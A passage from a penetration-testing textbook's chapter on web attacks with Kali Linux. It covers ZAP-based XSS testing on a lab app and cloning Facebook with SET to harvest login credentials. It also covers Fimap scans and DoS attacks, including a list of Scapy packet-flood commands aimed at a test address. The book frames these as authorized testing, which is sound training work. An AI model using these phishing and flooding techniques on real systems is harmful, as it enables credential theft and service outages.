Here is a summary of setting up ZAP with Firefox, as explained in Chapter 3:
1. Accept the user agreement.
2. Generate an SSL certificate or import an existing one.
3. Import the certificate into a web browser such as Firefox by going to
Preferences | Advanced and selecting the Encryption subtab.
4. Click on View Certificates and import the certificate.
5. Check all the trust options for using the new certificate.
6. Setup your Internet browser to use ZAP as the default proxy. In Firefox,
this is found under Preferences | Advanced | Network.
7. Enter the proxy server localhost and port number 8080, which is the
default for ZAP proxy.
8. Check the box for using the proxy server for all protocols.
You will need to generate a certificate before you can use ZAP.
Once ZAP and Firefox are configured, load any URL in Firefox. You will see the
websites are now showing up in ZAP under the Sites tab. In this example, we went
to www.DrChaos.com and noticed we have quite few sites that were loaded because
of all links on the www.DrChaos.com homepage:
ZAP has the option to run active or passive scanners. Passive scans don't perform
attacks and should be safe to run on any web application. Active scans run a number
of attacks and are actively running codes against web applications, which could
trigger alarms for certain security defense products.
[ 226 ]
www.it-ebooks.info
Chapter 6
The following example will be using both active and passive scans. It is a good idea
to have a web server you can test rather than trying out ZAP on an unauthorized
server. Because we want to practice on a vulnerable web server we are authorized
to test against, we will go back to using the Google Gyuyere project.
Google has created the Gruyere project as a means to test web application exploits
and defenses .The Gyuyere project website has several vulnerabilities embedded
into it, including XSS. You can run your own Gruyere project online, or you can
download it to a local machine for your testing:
Create your own instance of Gruyere to test ZAP. When you do you will be given
your own unique URL. We were given http://google-gruyere.appspot.
com/326352883334/ for our URL.
We will go back to ZAP and do a quick scan of this URL:
[ 227 ]
www.it-ebooks.info
Web Attacks
The screenshot example shows a bunch of SEED files including one that is
interestingly labeled: http://google-gruyere.appspot.com/326352883334/
invalid.
When we place this in a browser, we get the following error message:
When it comes to XSS, the most dangerous characters in a URL are . If a
hacker can get an application to insert what they want in a page using 
directly, then that opens a door to inject malicious scripts. Here are some other
interesting SEED files:
[ 228 ]
www.it-ebooks.info
Chapter 6
Here is an example of taking advantage of one of these SEED links by injecting a
script. We will create a URL and add the alert(1) script to see if the website will
create a popup error:
http://google-gruyere.appspot.com/326352883334/
The example shows our target web application server issue a popup proving that
this site is vulnerable to an attack. We can use ZAP to replay the attack, try other
attacks, or test similar XSS methods.
We recommend playing around with errors you find and see if you can manipulate
them to generate a sensitive output for your Penetration Testing exercises. The Gruyere
project is a great way to test your skills finding other vulnerabilities using ZAP.
To defend against remote attacks, ZAP can be great for testing web vulnerabilities such
as XSS attacks. Some people believe that users don't need to be concerned with XSS
when surfing websites if the browser advertises that it has XSS defense capabilities.
The truth behind that concept is that trust in browser protection can't be perfect, based
on the principle that browsers are not aware of how secure the code is behind the
web application. Clever hackers may be able to circumvent that protection, such as
exploiting an XSS vulnerability and issuing scripts against hosts visiting the website.
Best practices for protecting your server and clients accessing your applications is
identifying and remediating vulnerabilities using a tool such as ZAP.
[ 229 ]
www.it-ebooks.info
Web Attacks
SET password harvesting
We examined the basics of the Social Engineering Toolkit (SET) in Chapter 4. We are
going to revisit SET and look at some advanced concepts of password harvesting and
capturing privileged information.
As a refresher, we will launch SET by going to Exploitation Tools | Social
Engineering Tools | se-toolkit.
Make sure SET is updated if this if the first time using it. Steps for updating SET
and verifying whether GIT is installed can be found in Chapter 4.
When SET clones a website, it will run a web server. It is important
that whoever is being targeted is able to connect to your web server.
This means any Internet-based attack will need to leverage a public
IP address (either through NAT or directly on Kali Linux), as well as
opening firewall rules to permit access to Kali from a remote location.
Once you have taken care of any IP configurations, it is time to launch SET:
We will now use SET to harvest passwords. SET has the ability to clone any website
you want. We are actually going to pick one of the most popular social engineering
sites in this example to clone. Agree to any license agreements you may come across
with SET:
[ 230 ]
www.it-ebooks.info
Chapter 6
Selecting option 5 is recommended to update SET prior to using the tool
to ensure you have the latest updates. If you receive an error stating no
GIT repositories exist, you may have installed GIT incorrectly, or the
steps have changed since the writing of this text. Refer to the publisher's
website, Aamir Lakhani's blog at www.DrChaos.com or Joseph Muniz's
blog at www.thesecurityblogger.com for more tricks on using SET
with Kali Linux.
1. Once SET is updated, select option 1 for Social-Engineering Attacks.
2. Select option 2 for Website Attack Vectors
3. Select option 3 for Credential Harvester Attack
You have a few choices on how you want to clone a website. SET has templates for
popular sites, such as Facebook and Gmail. Sometimes these templates don't work;
however, we recommended starting with these or cloning another website. To clone
a website, you need a URL, and SET will automatically try to clone it.
If you already have cloned a website or have the HTML files loaded on Kali, you can
select custom import. When you select this option, you will need to tell Kali where
the HTML files are located on the local file system.
[ 231 ]
www.it-ebooks.info
Web Attacks
For our example, we will choose web templates. SET will ask on what IP address
it should listen. This will be the IP address for the interface on Kali Linux. The
exception to this is when using NAT on a firewall. In that case, you will need to use
the NAT or public address rather than IP address on Kali Linux so that targets can
access the system. The next example will use the local loopback address of 127.0.0.1.
Next, SET will ask to select a template. For this example, we will select Facebook.
The next example shows a web browser going to 127.0.0.1 and displaying our fake
Facebook page. If a template page does not look quite right, you may want to use a
different template or clone the desired page:
Notice our address bar states 127.0.0.1. Typically, you will need to use some other
attack vector to fool users to go to your website. There are numerous ways to do this,
such as sending them a link or a fake email:
[ 232 ]
www.it-ebooks.info
Chapter 6
When we enter our username in the fake Facebook website, SET captures the traffic.
SET will also redirect users to the real website. The hope is that the victims will
believe they entered their password wrong when redirected to the real Facebook and
continue using Facebook without knowing that SET captured their login credentials:
The previous example shows SET had captured our username: DrChaos, and our
Password as ILoveKali.
When you have completed this exercise, press Ctrl +C to exit the SET tool, and
generate an HTML report. SET creates a professional report that can be used in
your Penetration Test reports:
[ 233 ]
www.it-ebooks.info
Web Attacks
Fimap
Fimap is a Python tool that can find, prepare, audit, exploit and Google automatically
for local and remote file Inclusion (LFI and RFI) bugs in web applications.
Fimap can be found under Web Applications | Web Vulnerability Scanners |
Fimap. When you open Fimap, a terminal window opens displaying the home
screen. Fimap has a few plugin options, which you can download by using the
following command:
fimap --install â€“plugins
All available plugins will be displayed as a list, with the option to select one to install
or else quit. In the following example, there are two available plugins to install. You
will have to run the install command twice to install each plugin individually:
To use Fimap, you first need to determine your target by specifying the URL. There
are options for specifying a URL, a list of URLs using Google to acquire URLs, or other
methods such as harvesting URLs from other URLs, as well as looking at forms and
headers. For the following example, we will target www.thesecurityblogger.com.
[ 234 ]
www.it-ebooks.info
Chapter 6
To scan thesecurityblogger.com website, type the following command:
fimap -u 'http://wwwthesecurityblogger.com'
Fimap will attempt to identify any file inclusion vulnerabilities. The following
example shows that our target is not vulnerable to a file inclusion attack:
Denial of Services (DoS)
Typically, a Penetration Testing exercise is focused on identifying the gaps in
security rather than harming a system. This is a key feature that separates a real
attacker from an authorized Penetration Tester. Real hackers don't follow the rules
and are not concerned about interrupting business if it can improve their situation.
In some cases, a hacker is looking to create any form of negative impact on a target,
including taking down critical systems. For this reason, it makes sense in some cases
to test systems for the risk of Denial of Service (DoS) type attacks. This is commonly
termed as stress testing your Internet facing services.
It is absolutely critical to have an approval to test an asset for DoS
vulnerabilities. Some attack methods may have a negative impact to
a system post-Penetration Test. It is advised to test against redundant
systems, lab equipment, or nonproduction systems if possible.
The most common DoS attack involves flooding a target with external communication
requests. This overload prevents the resource from responding to legitimate traffic,
or slows its response so significantly that it is rendered unavailable. DoS attacks
can target system resources (IE disk space, bandwidth, and so on), configuration
information (IE remove route tables), state information (TCP session resetting), or
anything that can harm system operation.
The difference between a DoS and Distributed Denial of Service
(DDoS) is that a DoS attack involves one machine while a DDoS
attack involves many. DDoS is out of scope for this text.
[ 235 ]
www.it-ebooks.info
Web Attacks
There are four major DoS/DDoS attack categories:
â€¢ Volume Based Attacks: It involves UDP floods, ICMP floods, and other
spoofed packet-based floods. The purpose is to saturate the bandwidth of
the victim website.
â€¢ Protocol Attacks: It consumes resources of servers or intermediate
communication equipment, such as routers, firewalls, load balancers,
and so on. Examples are SYN floods, Ping of death, Smurf, Teardrop,
fragmented packets, and so on.
â€¢ Application Layer Attacks: It leverages legitimate traffic to crash a web
service. The examples include Zero-day attacks, vulnerability exploitation,
and so on.
â€¢ Session Exhaustion: Abusing session limitations by repeatedly establishing
but not closing new sessions with the goal of consuming resources.
Kali Linux contains multiple vulnerability exploitation tools covered in previous
chapters that can be used for Application Layer DoS attacks such as Metasploit.
Also, Chapter 3 covered a popular Protocol DoS tool Scapy. Here are a few more tools
available in Kali Linux to perform DoS attacks:
To test DoS, you can use www.upordown.org to view whether
a website is available.
THC-SSL-DOS
The Secure Socket Layer (SSL) protocol is used to secure connections and
transactions over the Internet. Establishing a secure SSL connection requires 15x
more processing power on the server than client. THC-SSL-DOS exploits this
asymmetric property by overloading the server until it is unable to provide any
service to legitimate users. The attack exploits the SSL secure re-negotiation feature
to trigger thousands of re-negotiations using a single TCP connection. This is known
as an SSL-Exhaustion attack. The advantage of this approach is that the processing
capacity for SSL handshakes is far superior at the client side, meaning that a common
laptop over an average network connection can challenge a web application server.
This is a known vulnerability, and no real solution exists to remediate this as of the
writing of this text.
[ 236 ]
www.it-ebooks.info
Chapter 6
To access THC-SSL-DOS, navigate to Stress Testing | Web Stress Testing | thc-ssl-
dos. This will bring up a terminal window with the homepage for THC-SSL-DOS. To
run THC-SSL-DOS against a target, type t:
thc-ssl-dos [options]   and --accept
You must include --accept or you will get the following error message:
Once THC-SSL-DOS is executed, you will see some funny verbiage stating it is
starting and the handshake process being exploited. In the following screenshot,
we will show a website that doesn't leverage SSL; hence showing connection errors.
The second screenshot shows the successful handshakes, which will eventually
DoS the target. Remember, you should only attempt this on IPs and sites you
have permission to test. These attacks could severely damage a web site or
web application:
[ 237 ]
www.it-ebooks.info
Web Attacks
Scapy
One of the most popular DoS tools is Scapy. Scapy is a packet manipulation tool for
computer networks, written in Python by Philippe Biondi. Scapy can forge or decode
packets, send them on the wire, capture them, and match requests and replies. Also,
it can handle tasks such as scanning, tracerouting, probing, unit tests, attacks, and
network discovery.
One common trick is to manipulate TCP packets from Kali and send it out via Scapy.
To start Scapy, type scapy in the terminal window. Once scapy has been launched,
type in command syntax:
In this following screenshot, we are going to use Scapy to send malformed TCP
packets to our test server. In this use case, our test server is 10.0.0.1. This could be a
router or a web server. Also, we are going to specify the number of packets we will
send to our destination. In this case we are sending 2000 packets using the command:
send(IP(dst="10.0.0.1",ttl=0)/TCP(),iface="eth0",count=2000)
In the previous command line, we are sending 2000 packets from our eth0 interface
on our Kali server to the destination address 10.0.0.1. Also, we are sending
the target a time to live value of 0. This is pretty much impossible from a TCP
standpoint. Essentially, we are trying to confuse the web server with a bad TTL
value. Attackers in real life send millions of these packets. It should be noted that a
system under the right circumstances may crash or become corrupt from a single bad
or malformed packet. We can adjust the count or other parameters we may need to
for our attack:
Here are some other popular attack scenarios used by Scapy:
Bad IP Version
send(IP(dst="10.0.0.1", src="10.20.30.40", version=0)/
TCP(dport="www"), iface="eth0", count=2000)
[ 238 ]
www.it-ebooks.info
Chapter 6
Bad TCP Checksum
send(IP(dst="10.0.0.1")/TCP(chksum=0x5555),iface="eth0",count=2000)
Bad TCP Flags (All Cleared and SEQ# == 0)
send(IP(dst="10.0.0.1")/TCP(flags="",seq=555),iface="eth0",
count=2000)
Bad TCP flags (All Flags Set)
send(IP(dst="10.0.0.1")/TCP(flags=0x0ff),iface="eth0",count=2000)
FIN Only Set
send(IP(dst="10.0.0.1")/TCP(flags="F"),iface="eth0",count=2000)
Header Length > L2 Length
send(IP(dst="10.0.0.1", src="10.20.30.40", ihl=15L)/TCP(dport="www"),
iface="eth0", count=2000)
Header length Too Short
send(IP(dst="10.0.0.1", src="10.20.30.40", ihl=2L)/TCP(dport="www"),
iface="eth0", count=2000)
ICMP Flood
send(IP(dst="10.0.0.1")/ICMP(),iface="eth0",count=2000)
IP Error Checksum
send(IP(dst="10.0.0.1", src="10.20.30.40", chksum=0x5500)/
TCP(dport="www"), iface="eth0", count=2000)
IP Fragment
send(IP(dst="10.0.0.1", src="10.20.30.40", frag=1)/TCP(dport="www"),
iface="eth0", count=2000)
IP Length > L2 Length
send(IP(dst="10.0.0.1", src="10.20.30.40", ihl=5L, len=80)/
TCP(dport="www"), iface="eth0", count=2000)
IP Source Address == Destination Address
send(IP(dst="10.0.0.1", src="10.0.0.1")/TCP(dport="www"),
iface="eth0", count=2000)
[ 239 ]
www.it-ebooks.info
Web Attacks
L2 Length >> IP Length
send(IP(dst="10.0.0.1",len=32)/Raw(load="bla-bla-bla-bla-bla-bla-
bla-bla"),iface="eth0",count=2000)
send(IP(dst="10.0.0.1",len=32)/UDP(dport=80,len=48)/Raw(load=
"bla-bla-bla-bla-bla-bla-bla-bla"),iface="eth0",count=2000)
send(IP(dst="10.0.0.1",len=32)/ICMP()/Raw(load="bla-bla-bla-bla-
bla-bla-bla-bla"),iface="eth0",count=2000)
No L4
send(IP(dst="10.0.0.1", src="10.20.30.40"), iface="eth0", count=2000)
SYN && FIN Set
send(IP(dst="10.0.0.1")/TCP(flags="FS"),iface="eth0",count=2000)
TCP Header Length > L2 Length
send(IP(dst="10.0.0.1", src="10.20.30.40")/
TCP(dport="www", dataofs=15L), iface="eth0", count=2000)
TCP Header Length Too Short (Length < 5)
send(IP(dst="10.0.0.1", src="10.20.30.40")/
TCP(dport="www", dataofs=1L), iface="eth0", count=2000)
Slowloris
[ 240 ]
www.it-ebooks.info
Chapter 6
Slowloris is a low bandwidth HTTP client that can issue DoS attacks. What makes
Slowloris unique is its method of attacking a target without using common flooding
techniques. Slowloris holds connections open by sending partial HTTP requests. It
continues to send several hundred subsequent headers at regular intervals to keep
sockets from closing. This behavior will overwhelm the target's resources, making
it unable to respond to legitimate traffic. High-traffic websites may take a long time